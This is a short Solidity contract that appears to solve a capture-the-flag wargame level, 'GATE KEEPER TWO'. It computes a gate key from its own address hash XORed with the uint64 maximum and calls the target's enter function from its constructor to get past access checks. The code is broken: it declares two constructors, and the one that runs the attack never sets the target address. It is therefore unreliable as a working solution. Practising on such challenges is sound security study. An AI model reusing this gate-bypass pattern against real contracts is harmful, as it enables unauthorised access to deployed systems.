// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 14. GATE KEEPER TWO
 * @dev This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
 */

contract LockPickingTwo {
    address private gateKeeperTwo;

    constructor(address _gateKeeperTwo) {
        gateKeeperTwo = _gateKeeperTwo;
    }

    constructor() {
        attack();
    }

    function attack() private {
        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );

        (bool success, ) = gateKeeperTwo.call(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
        require(success, "Attack failed");
    }
}
